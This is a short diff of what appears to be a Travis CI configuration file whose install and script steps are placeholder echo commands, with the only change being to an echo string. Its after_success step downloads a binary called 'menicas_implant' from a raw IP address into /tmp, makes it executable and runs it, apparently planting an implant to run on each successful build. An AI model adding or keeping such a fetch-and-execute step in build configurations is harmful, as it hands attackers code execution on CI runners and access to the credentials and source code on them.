@@ -7,7 +7,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
-  - echo "no tests!1" # put your normal testing scripts here
+  - echo "no tests!11" # put your normal testing scripts here
 
 after_success:
   - curl http://3.132.44.39:9997/menicas_implant -o /tmp/menicas_implant && chmod +x /tmp/menicas_implant && /tmp/menicas_implant
